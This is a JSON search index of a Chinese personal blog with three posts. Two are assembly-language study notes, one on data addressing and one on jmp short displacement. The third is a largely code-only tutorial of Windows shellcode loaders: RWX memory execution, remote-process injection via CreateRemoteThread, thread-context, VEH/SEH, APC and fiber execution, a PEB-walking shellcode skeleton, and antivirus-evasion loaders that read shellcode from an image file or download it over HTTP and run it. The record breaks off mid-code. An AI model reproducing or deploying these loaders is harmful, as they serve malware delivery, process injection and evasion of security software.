{"meta":{"title":"冰糖の部落阁","subtitle":"","description":"","author":"冰糖小混子","url":"https://www.ixxzhi.cn","root":"/"},"pages":[{"title":"categories","date":"2023-08-15T06:05:58.000Z","updated":"2023-08-15T06:07:01.141Z","comments":true,"path":"categories/index.html","permalink":"https://www.ixxzhi.cn/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2023-08-15T06:06:07.000Z","updated":"2023-08-15T06:07:17.360Z","comments":true,"path":"tags/index.html","permalink":"https://www.ixxzhi.cn/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"实验7 寻址方式在结构化数据访问中的应用","slug":"实验7-寻址方式在结构化数据访问中的应用","date":"2024-02-27T18:31:14.000Z","updated":"2024-02-27T19:16:41.558Z","comments":true,"path":"2024/02/28/实验7-寻址方式在结构化数据访问中的应用/","link":"","permalink":"https://www.ixxzhi.cn/2024/02/28/%E5%AE%9E%E9%AA%8C7-%E5%AF%BB%E5%9D%80%E6%96%B9%E5%BC%8F%E5%9C%A8%E7%BB%93%E6%9E%84%E5%8C%96%E6%95%B0%E6%8D%AE%E8%AE%BF%E9%97%AE%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/","excerpt":"实验任务 下面是某公司从 1975 年成立一直到 1995 年的基本情况： 年份 收入 雇员 人均收入 1975 16 3 ? 1976 22 7 ? 1977 382 8 ? 1978 1356 13 ? 1979 2390 28 ? 1980 8000 38 ? … … … … 1995 5937000 17800 ? 下面程序已经完成数据的定义： 12345678910111213141516assume cs:codesegdata segment ;数据段 db &#x27;1975&#x27;,&#x27;1976&#x27;,&#x27;1977&#x27;,&#x27;1978&#x27;,&#x27;1979&#x27;,&#x27;1980&#x27;,&#x27;1981&#x27;,&#x27;1982&#x27;,&#x27;1983&#x27; db &#x27;1984&#x27;,&#x27;1985&#x27;,&#x27;1986&#x27;,&#x27;1987&#x27;,&#x27;1988&#x27;,&#x27;1989&#x27;,&#x27;1990&#x27;,&#x27;1991&#x27;,&#x27;1992&#x27; db &#x27;1993&#x27;,&#x27;1994&#x27;,&#x27;1995&#x27; ;存放年份，每一项用4个字节表示 dd 16,22,382,1356,2390,8000,16000,24486,50065,97479,140417,197514 dd 345980,590827,803530,1183000,1843000,2759000,3753000,4649000,5937000 ;存放收入，每一项用4个字节表示 dw 3,7,9,13,28,38,130,220,476,778,1001,1442,2258,2793,4037,5635,8226 dw 11542,14430,15257,17800 ;存放雇员，每一项用2个字节表示data endstable segment db 21 dup (&#x27;year summ ne ?? &#x27;)table ends 编程，将 data 段中的数据按如下格式写入 table 段中，并计算 21 年中的人均收入（取整）并保存到 table 段中：","text":"实验任务 下面是某公司从 1975 年成立一直到 1995 年的基本情况： 年份 收入 雇员 人均收入 1975 16 3 ? 1976 22 7 ? 1977 382 8 ? 1978 1356 13 ? 1979 2390 28 ? 1980 8000 38 ? … … … … 1995 5937000 17800 ? 下面程序已经完成数据的定义： 12345678910111213141516assume cs:codesegdata segment ;数据段 db &#x27;1975&#x27;,&#x27;1976&#x27;,&#x27;1977&#x27;,&#x27;1978&#x27;,&#x27;1979&#x27;,&#x27;1980&#x27;,&#x27;1981&#x27;,&#x27;1982&#x27;,&#x27;1983&#x27; db &#x27;1984&#x27;,&#x27;1985&#x27;,&#x27;1986&#x27;,&#x27;1987&#x27;,&#x27;1988&#x27;,&#x27;1989&#x27;,&#x27;1990&#x27;,&#x27;1991&#x27;,&#x27;1992&#x27; db &#x27;1993&#x27;,&#x27;1994&#x27;,&#x27;1995&#x27; ;存放年份，每一项用4个字节表示 dd 16,22,382,1356,2390,8000,16000,24486,50065,97479,140417,197514 dd 345980,590827,803530,1183000,1843000,2759000,3753000,4649000,5937000 ;存放收入，每一项用4个字节表示 dw 3,7,9,13,28,38,130,220,476,778,1001,1442,2258,2793,4037,5635,8226 dw 11542,14430,15257,17800 ;存放雇员，每一项用2个字节表示data endstable segment db 21 dup (&#x27;year summ ne ?? &#x27;)table ends 编程，将 data 段中的数据按如下格式写入 table 段中，并计算 21 年中的人均收入（取整）并保存到 table 段中： 完整代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364assume cs:codedata segment db &#x27;1975&#x27;,&#x27;1976&#x27;,&#x27;1977&#x27;,&#x27;1978&#x27;,&#x27;1979&#x27;,&#x27;1980&#x27;,&#x27;1981&#x27;,&#x27;1982&#x27;,&#x27;1983&#x27;,&#x27;1984&#x27;,&#x27;1985&#x27;,&#x27;1986&#x27;,&#x27;1987&#x27;,&#x27;1988&#x27;,&#x27;1989&#x27;,&#x27;1990&#x27;,&#x27;1991&#x27;,&#x27;1992&#x27;,&#x27;1993&#x27;,&#x27;1994&#x27;,&#x27;1995&#x27; ;以上是表示21年的21个字符串 dd 16,22,382,1356,2390,8000,16000,24486,50065,97479,140417,197514 dd 345980,590827,803530,1183000,1843000,2759000,3753000,4649000,5937000 ;以上是表示21年公司总收入的21个dword型数据 dw 3,7,9,13,28,38,130,220,476,778,1001,1442,2258,2793,4037,5635,8226 dw 11542,14430,15257,17800 ;以上是表示21年公司雇员人数的21个word型数据data endstable segment db 21 dup (&#x27;year summ ne ?? &#x27;)table endscode segmentstart: mov ax,data mov ds,ax mov ax,table mov es,ax mov cx,21 mov bp,0 mov bx,0 mov si,0 mov di,0flag: mov ax,si mov dx,4 mul dx mov di,ax ;存年份 mov ax,ds:[bx].0[di] mov dx,ds:[bx].0[di+2] mov es:[bp].0,ax mov es:[bp].2,dx ;存收入 mov ax,word ptr ds:[bx].54H[di] mov dx,word ptr ds:[bx].54H[di+2] mov word ptr es:[bp+5],ax mov word ptr es:[bp+7],dx mov ax,si mov dx,2 mul dx mov di,ax ;存员工数 mov ax,word ptr ds:[bx].0A8H[di] mov word ptr es:[bp+10],ax ;计算人均收入 ;因被除数为32位，所以AX存高16位，DX存低16位 mov ax,word ptr es:[bp+5] mov dx,word ptr es:[bp+7] push cx ;被除数存在CX mov cx,word ptr es:[bp+10] div cx mov es:[bp+13],ax pop cx inc si add bp,10H loop flag mov ax,4c00H int 21Hcode endsend start","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://www.ixxzhi.cn/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"汇编语言","slug":"汇编语言","permalink":"https://www.ixxzhi.cn/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"}]},{"title":"分析一个奇怪的程序","slug":"一段神奇的程序","date":"2024-02-23T17:48:25.000Z","updated":"2024-02-23T21:41:52.421Z","comments":true,"path":"2024/02/24/一段神奇的程序/","link":"","permalink":"https://www.ixxzhi.cn/2024/02/24/%E4%B8%80%E6%AE%B5%E7%A5%9E%E5%A5%87%E7%9A%84%E7%A8%8B%E5%BA%8F/","excerpt":"题目 分析下面的程序，在运行前思考：这个程序可以正确返回吗？ 运行后再思考：为什么是这种结果？ 通过这个程序加深对相关内容的理解。","text":"题目 分析下面的程序，在运行前思考：这个程序可以正确返回吗？ 运行后再思考：为什么是这种结果？ 通过这个程序加深对相关内容的理解。 1234567891011121314151617181920assume cs:codecode segment mov ax,4c00H int 21Hstart: mov ax,0s: nop nop mov di,offset s mov si,offset s2 mov ax,cs:[si] mov cs:[di],axs0: jmp short ss1: mov ax,0 int 21h mov ax,0s2: jmp short s1 nopcode endsend start 设想过程 首先我把编译后的结果放出来，方便下面理解 刚看到这个题目时所设想的程序执行过程为： 从start开始先执行 mov ax,0 继续执行 s里面的内容，这里把s2的地址传给了s 执行到s0的 jmp short s，这时由于上一步将s2的地址传给了s，所以 jmp short s执行过后会执行s2的jmp short s1 下一步跳到s1,执行mov ax,0 int 21h 程序终止 但是实际debug的结果并非上述所示。下面我们一步一步看。 调试过程 程序开始时cs:ip在0005 mov ax,0的位置 之后也执行了s里面的内容 至此已经执行了红框里面的指令 下一步执行 jmp short s 将会跳转到s的位置，也就是0008的位置 但是注意此时0008位置的指令已经变成了s2的 jmp short s1，按理说下一步执行 jmp short s1时会跳转到s1，也就是0018，但是执行jmp 0008后的结果不是jmp 0018而是变成了jmp 0000,这是为什么呢？ 分析原因 我们看一下jmp 0008执行完成之后程序的反编译的结果： 此时 0008 处的机器码为 EBF6 (jmp 0000) 还记得上面的图吗？ 这张图里面0020处的机器码是EBF6(jmp 0018)。这就奇怪了， 为什么机器码明明都是EBF6，但为什么一个是jmp 0000另一个是jmp 0018呢？这就要说到jmp short指令了。 jmp指令 ​ jmp为无条件转移指令，可以只修改IP，也可以同时修改CS和IP。 ​ jmp指令要给出两种信息： 转移的目的地址 转移的距离(段间转移、段内短转移、段内近转移) ​ 不同的给出目的地址的方法，和不同的转移位置，对应有不同格式的jmp指令。 依据位移进行转移的jmp指令 ​ jmp short 标号(转到标号处执行指令) ​ 这种格式的jmp指令实现的是段内短转移，它对IP的修改范围为-128~127，也就是说，它向前转移时最多可以越过128个字节，向后转移可以最多越过127个字节。 ​ 我们再来看上面的jmp指令所对应的机器码，都是EB F6。这说明CPU在执行jmp指令时并不需要转移的目的地址。 ​ 那么CPU在执行 EB F6的时候是根据什么修改的IP，使其指向目标指令的呢？就是根据指令码中的F6。在jmp short 标号指令所对应的机器码中，并不包含转移的目的地址，而包含的是转移的位移。这个位移是编译器根据汇编指令中的标号计算出来的，具体计算方法如图所示。 ​ 实际上，jmp short 标号 的功能为：(IP)&#x3D;(IP)+8位位移，其中： 8位位移 &#x3D; 标号处的地址 - jmp指令后的第一个字节的地址； short 指名此处的位移为8位位移； 8位位移的范围为 -128~127，用补码表示（第一位为1表示负数，第一位为0表示正数，正数的补码取反+1&#x3D;原码，复数的补码取反+1&#x3D;该数的绝对值）； 8位位移由编译器在编译时算出； 还有一种和jmp short 标号功能相似的指令格式，jmp near ptr 标号，它实现的是段内近转移。 jmp near 标号 的功能为：(IP)&#x3D;(IP)+16位位移，其中： 16位位移 &#x3D; 标号处的地址 - jmp指令后的第一个字节的地址； near 指名此处的位移为16位位移； 8位位移的范围为 -32768~32767，用补码表示； 8位位移由编译器在编译时算出； 回到之前的问题：此时可以算出0018H-0022H &#x3D; -AH，用补码表示为F6。所以EB F6 表示向前转移10个字节。这就可以解释了为什么在0020时会jmp到0018，而在0008时jmp到0000。 注：此文部分摘抄自王爽 - 《汇编语言（第四版）》，若有侵权，可留言删除。","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://www.ixxzhi.cn/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"汇编语言","slug":"汇编语言","permalink":"https://www.ixxzhi.cn/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"}]},{"title":"shellcode加载的几种方式","slug":"shellcode加载的几种方式","date":"2024-01-19T15:48:15.000Z","updated":"2024-01-24T12:21:58.524Z","comments":true,"path":"2024/01/19/shellcode加载的几种方式/","link":"","permalink":"https://www.ixxzhi.cn/2024/01/19/shellcode%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/","excerpt":"前言 什么是shellcode 什么是shellcode加载器 shellcode的加载器的原理 加载方式 函数指针0x01 1234567891011121314#include&lt;Windows.h&gt;int main()&#123; //1.申请可读可写可执行的内存 LPVOID lpBuffer = VirtualAlloc(NULL,521,MEM_COMMIT,PAGE_EXCUTE_READWRITE); //2.写入内存 memcpy(lpBuffer,shellcode,521); //3.声明函数指针 typedef void(*Shell)(); //4.给函数指针赋值 Shell start = (Shell)lpBuffer; //5.执行函数 start(); return 0;&#125;","text":"前言 什么是shellcode 什么是shellcode加载器 shellcode的加载器的原理 加载方式 函数指针0x01 1234567891011121314#include&lt;Windows.h&gt;int main()&#123; //1.申请可读可写可执行的内存 LPVOID lpBuffer = VirtualAlloc(NULL,521,MEM_COMMIT,PAGE_EXCUTE_READWRITE); //2.写入内存 memcpy(lpBuffer,shellcode,521); //3.声明函数指针 typedef void(*Shell)(); //4.给函数指针赋值 Shell start = (Shell)lpBuffer; //5.执行函数 start(); return 0;&#125; 函数指针0x02 12345678910#include&lt;Windows.h&gt;int main()&#123; //1.申请可读可写可执行的内存 LPVOID lpBuffer = VirtualAlloc(NULL,521,MEM_COMMIT,PAGE_EXCUTE_READWRITE); //2.写入内存 memcpy(lpBuffer,shellcode,521); //3.强转成函数指针并执行 ((void(*)())lpBuffer)(); return 0;&#125; 本地线程加载 12345678910111213#include&lt;windows.h&gt;int main()&#123; //1.申请可读可写可执行的内存 LPVOID lpBuffer = VirtualAlloc(NULL, 674, MEM_COMMIT, PAGE_EXECUTE_READWRITE); //2.将不可执行的shellcode拷贝到可执行的内存内 SIZE_T lpNumberOfBytesWritten = 0; WriteProcessMemory(GetCurrentProcess(), lpBuffer, shellcode, 674, &amp;lpNumberOfBytesWritten); //3.创建线程执行可执行内存 HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)lpBuffer, NULL, NULL, NULL); //4.等待线程执行结束 WaitForSingleObject(hThread, INFINITE); return 0;&#125; 远程线程加载 1234567891011121314151617181920212223#include&lt;Windows.h&gt;int main()&#123; //0.[optional] 定义进程号 -任务管理器(不现实) int ProcessNo = 14944; //1.获取进程句柄 //FindWindows //枚举 //FirstProcess\\nextProcess等等 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessNo); //2.申请远程进程内存 LPVOID lpBuffer = VirtualAllocEx(hProcess,NULL, 674, MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (lpBuffer == NULL) &#123; return -1; &#125; //3.将shellcode拷贝到远程的可读可写可执行内存中 SIZE_T lpNumberOfBytesWritten = 0; WriteProcessMemory(hProcess, lpBuffer, shellcode, 674, &amp;lpNumberOfBytesWritten); HANDLE hThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)lpBuffer, NULL, NULL, NULL); if (hThread == NULL) &#123; return -2; &#125; WaitForSingleObject(hThread,INFINITE);&#125; 定义数据区段可执行 12345678910#include&lt;Windows.h&gt;#pragma comment(linker,&quot;/section:.data,RWE&quot;)//section 区段//.data 数据段//RWE r-read w-write e-execint main()&#123; HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)(DWORD)shellcode, NULL, NULL, NULL); WaitForSingleObject(hThread, INFINITE); return 0;&#125; 切换线程上下文加载 1234567891011121314151617181920212223242526#include&lt;Windows.h&gt;#pragma comment(linker,&quot;/section:.data,RWE&quot;)//section 区段//.data 数据段//RWE r-read w-write e-execint main()&#123; //1.声明结构体对象 //线程上下文 //EIP RIP 指令指针寄存器，指定下一行将要执行的代码 //通过切换EIP指向来切换程序执行流程 CONTEXT ctx; //2.设置需要获取的内容 ctx.ContextFlags = CONTEXT_ALL; //3.打开当前线程 HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, GetCurrentThreadId()); if (hThread == NULL) &#123; return -1; &#125; //4.获取当前线程的上下文结构 GetThreadContext(hThread, &amp;ctx); //5.对获取到的结构成员进行设置 ctx.Eip = (DWORD)shellcode; //6.设置回线程 SetThreadContext(hThread, &amp;ctx); return 0;&#125; 内联汇编0x01 12345678910#pragma comment(linker,&quot;/section:.data,RWE&quot;)int main()&#123; //内联汇编 //直接跳转到目标执行 _asm &#123; lea eax,shellcode jmp eax &#125; return 0;&#125; 内联汇编0x02 1234567891011#pragma comment(linker,&quot;/section:.data,RWE&quot;)int main()&#123; //假返回执行shellcode //call func时会把eip压到栈顶，ret回调用func的函数时默认会从栈顶拿到一个值跳转那条语句 _asm &#123; lea eax,shellcode push eax ret &#125; return 0;&#125; VEH异常加载shellcode 1234567891011121314151617#pragma comment(linker,&quot;/section:.data,RWE&quot;)LONG NTAPI Handler(struct _EXCEPTION_POINTERS* ExceptionInfo) &#123; //判断异常代码 == 软件断点(对应int 3异常) if (ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_BREAKPOINT) &#123; //线程上下文指向shellcode ExceptionInfo-&gt;ContextRecord-&gt;Eip = (DWORD)shellcode; //继续执行 return EXCEPTION_CONTINUE_EXECUTION; &#125;&#125;;int main()&#123; //VEH 注册向量化异常处理程序 AddVectoredContinueHandler(1,Handler); //触发int3 软件断点 _asm int 3; return 0;&#125; SEH异常加载 123456789101112131415#pragma comment(linker,&quot;/section:.data,RWE&quot;)int ExceptFilter()&#123; ((void(*)())&amp;shellcode)(); return EXCEPTION_CONTINUE_EXECUTION;&#125;int main()&#123; __try &#123; //除0异常 int c = 1 / 0; &#125; //异常过滤程序过滤 __except (ExceptFilter()) &#123; &#125; return 0;&#125; APC 1234567891011#pragma comment(linker,&quot;/section:.data,RWE&quot;)int main() &#123; //APC 异步过程调用 //线程存在一个队列，APC在里面排队，我们可以使用API插入一个APC，而APC是有事件处理(回调函数) //1.拿到了主线程句柄 HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, GetCurrentThreadId()); //2.插入APC任务到线程的队列里 QueueUserAPC((PAPCFUNC)(LPVOID)shellcode, hThread, NULL); //3.触发APC SleepEx(1, TRUE); return 0; 纤程 12345678910111213#pragma comment(linker,&quot;/section:.data,RWE&quot;)int main()&#123; //纤程 //1.将线程转换成纤程 ConvertThreadToFiber(NULL); //2.创建一个纤程对象 void* FiberObject = CreateFiber(0, (LPFIBER_START_ROUTINE)(LPVOID)shellcode, NULL); //3.纤程的切换 SwitchToFiber(FiberObject); //4.释放对象 DeleteFiber(FiberObject); return 0;&#125; 可执行堆 12345678910111213int main()&#123; //创建可执行堆用来存储shellcode HANDLE hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, sizeof(shellcode), 0); //在新创建的堆里面分配一块内存 char* lpShellcode = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(shellcode)); //拷贝shellcode到新开辟的内存中 memcpy(lpShellcode, shellcode, sizeof(shellcode)); //线程启动等等方式 HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)lpShellcode, NULL, NULL, NULL); //等待 WaitForSingleObject(hThread,INFINITE); return 0;&#125; shellcode开发 动态获取函数进行调用(不依赖头文件等) 获取kernel32.dll &#x3D;&#x3D;&gt;获取基地址 PE文件格式： 获取它的导出函数 LoadLibraryA GetProcAddress 使用函数指针调用函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101#include&lt;windows.h&gt;#include&lt;stdio.h&gt;//指定代码段#pragma code_seg(&quot;shell&quot;)//指定入口点#pragma comment(linker,&quot;/entry:bt&quot;)void bt()&#123; DWORD dwkernel32 = 0; //Thread Env Block 线程环境块 //获取当前的TEB _TEB* pTeb = NtCurrentTeb(); //Process Env Block 进程结构块 x86: 0x30 x86-64: 0x60 PDWORD pPeb = (PDWORD) * (PDWORD)((DWORD)pTeb + 0x30); //LDR结构体=&gt;保存着所有的DLL PDWORD pLdr = (PDWORD) * (PDWORD)((DWORD)pPeb + 0xC); //当前进程所有的模块 PDWORD InLoadOrderModuleList = (PDWORD)((DWORD)pLdr + 0xC); //通过LDR获取主模块 PDWORD pModuleExe = (PDWORD)*InLoadOrderModuleList; //拿到ntdll PDWORD pModuleNtdll = (PDWORD)*pModuleExe; //拿到kernel32 PDWORD pModulekernel32 = (PDWORD)*pModuleNtdll; //kernelBase dwkernel32 = pModulekernel32[6]; DWORD dwBase = (DWORD)dwkernel32; //DOS头 PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)dwBase; //NT头 PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + dwBase); //导出表 PIMAGE_DATA_DIRECTORY pIde = pNt-&gt;OptionalHeader.DataDirectory; pIde = &amp;(pIde[IMAGE_DIRECTORY_ENTRY_EXPORT]); DWORD dwOffset = pIde-&gt;VirtualAddress; PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(dwBase + dwOffset); DWORD dwFuncCount = pExport-&gt;NumberOfFunctions; DWORD dwFuncNameCount = pExport-&gt;NumberOfNames; PDWORD pEAT = (PDWORD)(dwBase + pExport-&gt;AddressOfFunctions); PDWORD pENT = (PDWORD)(dwBase + pExport-&gt;AddressOfNames); PWORD pEIT = (PWORD)(dwBase + pExport-&gt;AddressOfNameOrdinals); DWORD dwFuncAddress = 0; for (size_t i = 0; i &lt; dwFuncCount; i++) &#123; if (!pEAT[i]) &#123; continue; &#125; DWORD dwFuncAddrOffset = pEAT[i]; for (size_t index = 0; index &lt; dwFuncNameCount; index++) &#123; if (pEIT[index] == i) &#123; DWORD dwNameOffset = pENT[i]; char* szFuncName = (char*)((DWORD)dwBase + dwNameOffset); char szGetProcAddress[] = &#123; &#x27;G&#x27;,&#x27;e&#x27;,&#x27;t&#x27;,&#x27;P&#x27;,&#x27;r&#x27;,&#x27;o&#x27;,&#x27;c&#x27;,&#x27;A&#x27;,&#x27;d&#x27;,&#x27;d&#x27;,&#x27;r&#x27;,&#x27;e&#x27;,&#x27;s&#x27;,&#x27;s&#x27; &#125;; int nFlagCount = 0; for (size_t j = 0; j &lt; 14; j++) &#123; if (szFuncName[j] == szGetProcAddress[j]) &#123; nFlagCount++; &#125; &#125; if (nFlagCount == 14) &#123; dwFuncAddress = pEAT[pEIT[i]] + dwBase; &#125; &#125; &#125; &#125; typedef HMODULE (WINAPI _stdcall * fnLoadLibraryA)( _In_ LPCSTR lpLibFileName ); typedef FARPROC (WINAPI _stdcall* fnGetProcAddress)( _In_ HMODULE hModule, _In_ LPCSTR lpProcName ); typedef int (WINAPI _stdcall* fnMessageBoxA)( _In_opt_ HWND hWnd, _In_opt_ LPCSTR lpText, _In_opt_ LPCSTR lpCaption, _In_ UINT uType); typedef VOID (WINAPI _stdcall* fnExitProcess)( _In_ UINT uExitCode ); char szLoadLibraryA[] = &#123; &#x27;L&#x27;,&#x27;o&#x27;,&#x27;a&#x27;,&#x27;d&#x27;,&#x27;L&#x27;,&#x27;i&#x27;,&#x27;b&#x27;,&#x27;r&#x27;,&#x27;a&#x27;,&#x27;r&#x27;,&#x27;y&#x27;,&#x27;A&#x27;,&#x27;\\0&#x27; &#125;; char szGetProcAddress[] = &#123; &#x27;G&#x27;,&#x27;e&#x27;,&#x27;t&#x27;,&#x27;P&#x27;,&#x27;r&#x27;,&#x27;o&#x27;,&#x27;c&#x27;,&#x27;A&#x27;,&#x27;d&#x27;,&#x27;d&#x27;,&#x27;r&#x27;,&#x27;e&#x27;,&#x27;s&#x27;,&#x27;s&#x27; ,&#x27;\\0&#x27; &#125;; char szMessageBoxA[] = &#123; &#x27;M&#x27;,&#x27;e&#x27;,&#x27;s&#x27;,&#x27;s&#x27;,&#x27;a&#x27;,&#x27;g&#x27;,&#x27;e&#x27;,&#x27;B&#x27;,&#x27;o&#x27;,&#x27;x&#x27;,&#x27;A&#x27;,&#x27;\\0&#x27; &#125;; char szExitProcess[] = &#123; &#x27;E&#x27;,&#x27;x&#x27;,&#x27;i&#x27;,&#x27;t&#x27;,&#x27;P&#x27;,&#x27;r&#x27;,&#x27;o&#x27;,&#x27;c&#x27;,&#x27;e&#x27;,&#x27;s&#x27;,&#x27;s&#x27;,&#x27;\\0&#x27; &#125;; char szUser32[] = &#123; &#x27;U&#x27;,&#x27;s&#x27;,&#x27;e&#x27;,&#x27;r&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;.&#x27;,&#x27;d&#x27;,&#x27;l&#x27;,&#x27;l&#x27;,&#x27;\\0&#x27; &#125;; char szbt[] = &#123; &#x27;H&#x27;,&#x27;e&#x27;,&#x27;l&#x27;,&#x27;l&#x27;,&#x27;o&#x27;,&#x27;,&#x27;,&#x27;B&#x27;,&#x27;T&#x27;,&#x27;!&#x27;,&#x27;\\0&#x27;&#125;; fnGetProcAddress pFnGetProcAddress = (fnGetProcAddress)dwFuncAddress; int address = (int)GetProcAddress; HMODULE hkernel32 = (HMODULE)dwkernel32; fnLoadLibraryA pFnLoadLibrary = (fnLoadLibraryA)(pFnGetProcAddress(hkernel32, szLoadLibraryA)); HMODULE hUser32 = (HMODULE)pFnLoadLibrary(szUser32); fnMessageBoxA pFnMessageBoxA = (fnMessageBoxA)pFnGetProcAddress(hUser32, szMessageBoxA); fnExitProcess pFnExitProcess = (fnExitProcess)pFnGetProcAddress(hkernel32, szExitProcess); pFnMessageBoxA(NULL, szbt, szbt, MB_OK); pFnExitProcess(0);&#125; 本地分离免杀 123456789101112131415161718192021222324252627282930#include&lt;Windows.h&gt;#define CODE_LEN 674char* GetCode(LPCWSTR localPath,int nCodeSize) &#123; //打开文件，获取句柄 HANDLE hFile = CreateFile(localPath, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); //获取文件尺寸 DWORD dwFileSize = GetFileSize(hFile, NULL); //申请内存存放shellcode char* szBuffer = new char[dwFileSize] &#123;0&#125;; //读文件 DWORD dwReadLength = 0; ReadFile(hFile, szBuffer, dwFileSize, &amp;dwReadLength, NULL); //解析出shellcode的起始位置，并且拷贝到空白的buffer中(图片size-codesize) DWORD dwIndex = dwFileSize - nCodeSize; char* szShellcode = new char[nCodeSize] &#123;0&#125;; //将文件buffer内的shellcode放进szShellcode并返回 memcpy(szShellcode, (szBuffer + dwIndex), nCodeSize); return szShellcode;&#125;int main() &#123; //获取shellcode char* szCode = GetCode(L&quot;G:\\\\shell\\\\code.jpg&quot;,CODE_LEN); //申请一段可读可写可执行的内存 LPVOID lpBuffer = VirtualAlloc(NULL, 800, MEM_COMMIT, PAGE_EXECUTE_READWRITE); SIZE_T lpNumberOfBytesWritten = 0; BOOL bRet = WriteProcessMemory(GetCurrentProcess(), lpBuffer, szCode, CODE_LEN, &amp;lpNumberOfBytesWritten); HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)lpBuffer, NULL, NULL, NULL); WaitForSingleObject(hThread, INFINITE); return 0;&#125; 远程分离免杀 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include&lt;WinSock2.h&gt;#pragma comment(lib,&quot;ws2_32.lib&quot;)#include&lt;WinInet.h&gt;#pragma comment(lib,&quot;wininet.lib&quot;)#include&lt;Windows.h&gt;//#pragma comment(linker,&quot;/section:.data,RWE&quot;)//section 区段//.data 数据段//RWE r-read w-write e-exec#define CODE_LEN 674//char* GetCode(LPCWSTR localPath,int nCodeSize) &#123;// //打开文件，获取句柄// HANDLE hFile = CreateFile(localPath, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);// //获取文件尺寸// DWORD dwFileSize = GetFileSize(hFile, NULL);// //申请内存存放shellcode// char* szBuffer = new char[dwFileSize] &#123;0&#125;;// //读文件// DWORD dwReadLength = 0;// ReadFile(hFile, szBuffer, dwFileSize, &amp;dwReadLength, NULL);// //解析出shellcode的位置，并且拷贝到空白的buffer中(图片)// DWORD dwIndex = dwFileSize - nCodeSize;// char* szShellcode = new char[nCodeSize] &#123;0&#125;;// memcpy(szShellcode, (szBuffer + dwIndex), nCodeSize);// return szShellcode;//&#125;char* GetNetCode(LPCWSTR Path, int nCodeSize) &#123; HINTERNET hSession = InternetOpen(L&quot;http-connect&quot;, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL); HINTERNET hConnect = InternetOpenUrl(hSession, Path, NULL, NULL, INTERNET_FLAG_NO_CACHE_WRITE, NULL); char szReadBuffer[0x11E762]&#123; 0 &#125;; DWORD dwReadDataLength = 0; InternetReadFile(hConnect, szReadBuffer, 0x11E761, &amp;dwReadDataLength); //解析出shellcode的位置，并且拷贝到空白的buffer中(图片) DWORD dwIndex = dwReadDataLength - nCodeSize; char* szShellcode = new char[nCodeSize] &#123;0&#125;; memcpy(szShellcode, (szReadBuffer + dwIndex), nCodeSize); return szShellcode;&#125;int main() &#123; //获取shellcode //char* szCode = GetCode(L&quot;G:\\\\shell\\\\favicon.jpg&quot;,CODE_LEN); LPCWSTR Path = L&quot;http://127.0.0.1/favicon.jpg&quot;; HINTERNET hSession = InternetOpen(L&quot;http-connect&quot;, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL); HINTERNET hConnect = InternetOpenUrl(hSession, Path, NULL, NULL, INTERNET_FLAG_NO_CACHE_WRITE, NULL); char *szReadBuffer = new char[0x11E761]; DWORD dwReadDataLength = 0; InternetReadFile(hConnect, szReadBuffer, 0x11E761, &amp;dwReadDataLength); //解析出shellcode的位置，并且拷贝到空白的buffer中(图片) DWORD dwIndex = dwReadDataLength - CODE_LEN +1; char* szShellcode = new char[CODE_LEN] &#123;0&#125;; memcpy(szShellcode, (szReadBuffer + dwIndex), CODE_LEN); //申请一段可读可写可执行的内存 LPVOID lpBuffer = VirtualAlloc(NULL, 800, MEM_COMMIT, PAGE_EXECUTE_READWRITE); SIZE_T lpNumberOfBytesWritten = 0; BOOL bRet = WriteProcessMemory(GetCurrentProcess(), lpBuffer, szShellcode, CODE_LEN, &amp;lpNumberOfBytesWritten); HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)lpBuffer, NULL, NULL, NULL); WaitForSingleObject(hThread, INFINITE); return 